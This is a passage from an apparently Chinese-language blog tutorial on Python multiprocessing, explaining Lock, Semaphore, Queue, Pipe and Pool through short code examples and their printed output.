class="number">45759</span> LoopCount: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">12</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">12</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">13</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到有些输出已经造成了影响。 然后我们对其加锁：</p>
                  <figure class="highlight pgsql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, <span class="keyword">Lock</span></span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> MyProcess(Process):</span><br><span class="line">    def __init__(self, <span class="keyword">loop</span>, <span class="keyword">lock</span>):</span><br><span class="line">        Process.__init__(self)</span><br><span class="line">        self.<span class="keyword">loop</span> = <span class="keyword">loop</span></span><br><span class="line">        self.<span class="keyword">lock</span> = <span class="keyword">lock</span></span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> range(self.<span class="keyword">loop</span>):</span><br><span class="line">            <span class="type">time</span>.sleep(<span class="number">0.1</span>)</span><br><span class="line">            self.<span class="keyword">lock</span>.acquire()</span><br><span class="line">            print(<span class="string">'Pid: '</span> + str(self.pid) + <span class="string">' LoopCount: '</span> + str(count))</span><br><span class="line">            self.<span class="keyword">lock</span>.<span class="keyword">release</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">lock</span> = <span class="keyword">Lock</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>, <span class="number">15</span>):</span><br><span class="line">        p = MyProcess(i, <span class="keyword">lock</span>)</span><br><span class="line">        p.<span class="keyword">start</span>()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们在 print 方法的前后分别添加了获得锁和释放锁的操作。这样就能保证在同一时间只有一个 print 操作。 看一下运行结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45889</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">9</span></span><br><span class="line">Pid: <span class="number">45890</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">10</span></span><br><span class="line">Pid: <span class="number">45891</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">11</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">12</span></span><br><span class="line">Pid: <span class="number">45892</span> LoopCount: <span class="number">12</span></span><br><span class="line">Pid: <span class="number">45893</span> LoopCount: <span class="number">13</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>嗯，一切都没问题了。 所以在访问临界资源时，使用 Lock 就可以避免进程同时占用资源而导致的一些问题。</p>
                  <h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2>
                  <p>信号量，是在进程同步过程中一个比较重要的角色。可以控制临界资源的数量，保证各个进程之间的互斥和同步。 如果你学过操作系统，那么一定对这方面非常了解，如果你还不了解信号量是什么，可以参考 <a href="http://blog.csdn.net/qinxiongxu/article/details/7830537" target="_blank" rel="noopener">信号量解析</a> 来了解一下它是做什么的。 那么接下来我们就用一个实例来演示一下进程之间利用 Semaphore 做到同步和互斥，以及控制临界资源数量。</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="title">from</span> multiprocessing <span class="keyword">import</span> Process, Semaphore, Lock, Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="title">buffer</span> = <span class="type">Queue</span>(<span class="number">10</span>)</span><br><span class="line"><span class="title">empty</span> = <span class="type">Semaphore</span>(<span class="number">2</span>)</span><br><span class="line"><span class="title">full</span> = <span class="type">Semaphore</span>(<span class="number">0</span>)</span><br><span class="line"><span class="title">lock</span> = <span class="type">Lock</span>()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Consumer</span>(<span class="type">Process</span>):</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        global buffer, empty, full, lock</span></span><br><span class="line"><span class="class">        while <span class="type">True</span>:</span></span><br><span class="line"><span class="class">            full.acquire()</span></span><br><span class="line"><span class="class">            lock.acquire()</span></span><br><span class="line"><span class="class">            buffer.get()</span></span><br><span class="line"><span class="class">            print('<span class="type">Consumer</span> <span class="title">pop</span> <span class="title">an</span> <span class="title">element'</span>)</span></span><br><span class="line"><span class="class">            time.sleep(1)</span></span><br><span class="line"><span class="class">            lock.release()</span></span><br><span class="line"><span class="class">            empty.release()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Producer</span>(<span class="type">Process</span>):</span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        global buffer, empty, full, lock</span></span><br><span class="line"><span class="class">        while <span class="type">True</span>:</span></span><br><span class="line"><span class="class">            empty.acquire()</span></span><br><span class="line"><span class="class">            lock.acquire()</span></span><br><span class="line"><span class="class">            buffer.put(1)</span></span><br><span class="line"><span class="class">            print('<span class="type">Producer</span> <span class="title">append</span> <span class="title">an</span> <span class="title">element'</span>)</span></span><br><span class="line"><span class="class">            time.sleep(1)</span></span><br><span class="line"><span class="class">            lock.release()</span></span><br><span class="line"><span class="class">            full.release()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == '__main__':</span></span><br><span class="line"><span class="class">    p = <span class="type">Producer</span>()</span></span><br><span class="line"><span class="class">    c = <span class="type">Consumer</span>()</span></span><br><span class="line"><span class="class">    p.daemon = c.daemon = <span class="type">True</span></span></span><br><span class="line"><span class="class">    p.start()</span></span><br><span class="line"><span class="class">    c.start()</span></span><br><span class="line"><span class="class">    p.join()</span></span><br><span class="line"><span class="class">    c.join()</span></span><br><span class="line"><span class="class">    print '<span class="type">Ended</span>!'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如上代码实现了注明的生产者和消费者问题，定义了两个进程类，一个是消费者，一个是生产者。 定义了一个共享队列，利用了 Queue 数据结构，然后定义了两个信号量，一个代表缓冲区空余数，一个表示缓冲区占用数。 生产者 Producer 使用 empty.acquire()方法来占用一个缓冲区位置，然后缓冲区空闲区大小减小 1，接下来进行加锁，对缓冲区进行操作。然后释放锁，然后让代表占用的缓冲区位置数量+1，消费者则相反。 运行结果如下：</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Consumer pop <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br><span class="line">Producer append <span class="keyword">an</span> <span class="keyword">element</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以发现两个进程在交替运行，生产者先放入缓冲区物品，然后消费者取出，不停地进行循环。 通过上面的例子来体会一下信号量的用法。</p>
                  <h2 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h2>
                  <p>在上面的例子中我们使用了 Queue，可以作为进程通信的共享队列使用。 在上面的程序中，如果你把 Queue 换成普通的 list，是完全起不到效果的。即使在一个进程中改变了这个 list，在另一个进程也不能获取到它的状态。 因此进程间的通信，队列需要用 Queue。当然这里的队列指的是 multiprocessing.Queue 依然是用上面那个例子，我们一个进程向队列中放入数据，然后另一个进程取出数据。</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from multiprocessing import Process, Semaphore, <span class="keyword">Lock</span>, Queue</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">buffer = Queue(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">empty</span> = Semaphore(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">full</span> = Semaphore(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">lock</span> = <span class="keyword">Lock</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Consumer(Process):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> run(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">global</span> buffer, <span class="keyword">empty</span>, <span class="keyword">full</span>, <span class="keyword">lock</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            full.acquire()</span><br><span class="line">            lock.acquire()</span><br><span class="line">            print <span class="string">'Consumer get'</span>, buffer.get()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            lock.release()</span><br><span class="line">            empty.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Producer(Process):</span><br><span class="line">    <span class="keyword">def</span> run(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">global</span> buffer, <span class="keyword">empty</span>, <span class="keyword">full</span>, <span class="keyword">lock</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            empty.acquire()</span><br><span class="line">            lock.acquire()</span><br><span class="line">            <span class="keyword">num</span> = random()</span><br><span class="line">            print <span class="string">'Producer put '</span>, <span class="keyword">num</span></span><br><span class="line">            buffer.put(<span class="keyword">num</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            lock.release()</span><br><span class="line">            full.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Producer()</span><br><span class="line">    c = Consumer()</span><br><span class="line">    p.daemon = c.daemon = <span class="literal">True</span></span><br><span class="line">    p.start()</span><br><span class="line">    c.start()</span><br><span class="line">    p.join()</span><br><span class="line">    c.join()</span><br><span class="line">    print <span class="string">'Ended!'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Producer put  <span class="number">0.719213647437</span></span><br><span class="line">Producer put  <span class="number">0.44287326683</span></span><br><span class="line">Consumer <span class="keyword">get</span> <span class="number">0.719213647437</span></span><br><span class="line">Consumer <span class="keyword">get</span> <span class="number">0.44287326683</span></span><br><span class="line">Producer put  <span class="number">0.722859424381</span></span><br><span class="line">Producer put  <span class="number">0.525321338921</span></span><br><span class="line">Consumer <span class="keyword">get</span> <span class="number">0.722859424381</span></span><br><span class="line">Consumer <span class="keyword">get</span> <span class="number">0.525321338921</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到生产者放入队列中数据，然后消费者将数据取出来。 get 方法有两个参数，blocked 和 timeout，意思为阻塞和超时时间。默认 blocked 是 true，即阻塞式。 当一个队列为空的时候如果再用 get 取则会阻塞，所以这时候就需要吧 blocked 设置为 false，即非阻塞式，实际上它就会调用 get_nowait()方法，此时还需要设置一个超时时间，在这么长的时间内还没有取到队列元素，那就抛出 Queue.Empty 异常。 当一个队列为满的时候如果再用 put 放则会阻塞，所以这时候就需要吧 blocked 设置为 false，即非阻塞式，实际上它就会调用 put_nowait()方法，此时还需要设置一个超时时间，在这么长的时间内还没有放进去元素，那就抛出 Queue.Full 异常。 另外队列中常用的方法 Queue.qsize() 返回队列的大小 ，不过在 Mac OS 上没法运行。 原因：</p>
                  <blockquote>
                    <p>def qsize(self): # Raises NotImplementedError on Mac OSX because of broken sem_getvalue() return self._maxsize - self._sem._semlock._get_value()</p>
                  </blockquote>
                  <p>Queue.empty() 如果队列为空，返回 True, 反之 False Queue.full() 如果队列满了，返回 True,反之 False Queue.get([block[, timeout]]) 获取队列，timeout 等待时间 Queue.get_nowait() 相当 Queue.get(False) Queue.put(item) 阻塞式写入队列，timeout 等待时间 Queue.put_nowait(item) 相当 Queue.put(item, False)</p>
                  <h2 id="Pipe"><a href="#Pipe" class="headerlink" title="Pipe"></a>Pipe</h2>
                  <p>管道，顾名思义，一端发一端收。 Pipe 可以是单向(half-duplex)，也可以是双向(duplex)。我们通过 mutiprocessing.Pipe(duplex=False)创建单向管道 (默认为双向)。一个进程从 PIPE 一端输入对象，然后被 PIPE 另一端的进程接收，单向管道只允许管道一端的进程输入，而双向管道则允许从两端输入。 用一个实例来感受一下：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from multiprocessing import Process, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span>(<span class="title">Process</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, pipe)</span></span><span class="symbol">:</span></span><br><span class="line">        Process.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.pipe = pipe</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.pipe.send(<span class="string">'Consumer Words'</span>)</span><br><span class="line">        print <span class="string">'Consumer Received:'</span>, <span class="keyword">self</span>.pipe.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Producer</span>(<span class="title">Process</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, pipe)</span></span><span class="symbol">:</span></span><br><span class="line">        Process.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.pipe = pipe</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print <span class="string">'Producer Received:'</span>, <span class="keyword">self</span>.pipe.recv()</span><br><span class="line">        <span class="keyword">self</span>.pipe.send(<span class="string">'Producer Words'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    pipe = Pipe()</span><br><span class="line">    p = Producer(pipe[<span class="number">0</span>])</span><br><span class="line">    c = Consumer(pipe[<span class="number">1</span>])</span><br><span class="line">    p.daemon = c.daemon = True</span><br><span class="line">    p.start()</span><br><span class="line">    c.start()</span><br><span class="line">    p.join()</span><br><span class="line">    c.join()</span><br><span class="line">    print <span class="string">'Ended!'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里声明了一个默认为双向的管道，然后将管道的两端分别传给两个进程。两个进程互相收发。观察一下结果：</p>
                  <figure class="highlight groovy">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Producer <span class="string">Received:</span> Consumer Words</span><br><span class="line">Consumer <span class="string">Received:</span> Producer Words</span><br><span class="line">Ended!</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上是对 pipe 的简单介绍。</p>
                  <h2 id="Pool"><a href="#Pool" class="headerlink" title="Pool"></a>Pool</h2>
                  <p>在利用 Python 进行系统管理的时候，特别是同时操作多个文件目录，或者远程控制多台主机，并行操作可以节约大量的时间。当被操作对象数目不大时，可以直接利用 multiprocessing 中的 Process 动态成生多个进程，十几个还好，但如果是上百个，上千个目标，手动的去限制进程数量却又太过繁琐，此时可以发挥进程池的功效。 Pool 可以提供指定数量的进程，供用户调用，当有新的请求提交到 pool 中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程来它。 在这里需要了解阻塞和非阻塞的概念。 阻塞和非阻塞关注的是程序在等待调用结果（消息，返回值）时的状态。 阻塞即要等到回调结果出来，在有结果之前，当前进程会被挂起。 Pool 的用法有阻塞和非阻塞两种方式。非阻塞即为添加进程后，不一定非要等到改进程执行完就添加其他进程运行，阻塞则相反。 现用一个实例感受一下非阻塞的用法：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing import Lock, Pool</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def function(index):</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'Start process: '</span>, index</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'End process'</span>, index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   <span class="built_in"> pool </span>= Pool(<span class="attribute">processes</span>=3)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(4):</span><br><span class="line">        pool.apply_async(function, (i,))</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Started processes"</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"Subprocess done."</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里利用了 apply_async 方法，即非阻塞。 运行结果：</p>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
